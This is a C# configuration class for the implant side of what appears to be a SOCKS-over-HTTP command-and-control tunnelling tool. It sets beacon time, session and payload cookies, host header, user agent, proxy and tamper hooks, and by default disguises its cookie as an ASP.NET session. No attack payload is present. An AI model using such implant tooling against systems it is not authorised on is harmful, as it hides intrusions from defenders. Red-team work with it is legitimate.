using ImplantSide.Classes.Config;
using ImplantSide.Interfaces;
using System;
using System.Collections.Generic;
using System.Net;
using System.Threading;

namespace ImplantSide.Classes
{
    public class SocksClientConfiguration
    {
        public String CommandChannelSessionId
        {
            get
            {
                return (null == CommandChannel) ? Guid.Empty.ToString() : CommandChannel.CommandChannelSessionId;
            }
            set
            {
                GetCmdChannelConfig().CommandChannelSessionId = value;
            }
        }

        public Int16 BeaconTime
        {
            get
            {
                return GetCmdChannelConfig().CommandBeaconTime;
            }

            set
            {
                GetCmdChannelConfig().CommandBeaconTime = value;
            }
        }

        CommandChannelConfig GetCmdChannelConfig()
        {
            if (null == CommandChannel)
            {
                lock (_locker)
                {
                    if (null == CommandChannel)
                    {
                        CommandChannel = new CommandChannelConfig();
                    }
                }
            }
            return CommandChannel;
        }
        
        public CommandChannelConfig CommandChannel;
        public String ServerCookie { get; set; }
        public String PayloadCookieName { get; set; }
        public String HostHeader { get; set; }
        public System.Uri CommandServerUI
        {
            get
            {
                Monitor.Enter(_locker);
                var uri = _serverUri;
                Monitor.Exit(_locker);
                return uri;
            }
            set
            {
                Monitor.Enter(_locker);
                _serverUri = value;
                Monitor.Exit(_locker);
            }
        }
        public bool SSLFullValidation { get; set; }
        public String ServerHost { get; set; }
        public bool UseProxy { get; set; }
        public String UserAgent { get; set; }
        public IWebProxy WebProxy { get; set; }
        public IImplantLog ImplantComms { get; set; }
        public ITamper Tamper { get; set; }
        public List<String> URLPaths { get; set; }
        internal Uri URL
        {
            get
            {
                Monitor.Enter(_locker);
                var uri = _serverUri;
                Monitor.Exit(_locker);
                return uri;
            }
        }
        Uri _serverUri;
        object _locker = new Object();
        readonly static String DEFAULTSESSIONCOOKIENAME = "ASP.NET_SessionId";
        String _sessionId = null;
        public String SessionCookieName
        {
            get
            {
                if (!String.IsNullOrWhiteSpace(_sessionId))
                    return _sessionId;
                else
                    return DEFAULTSESSIONCOOKIENAME;
            }
            set
            {
                _sessionId = value;
            }
        }
    }
}
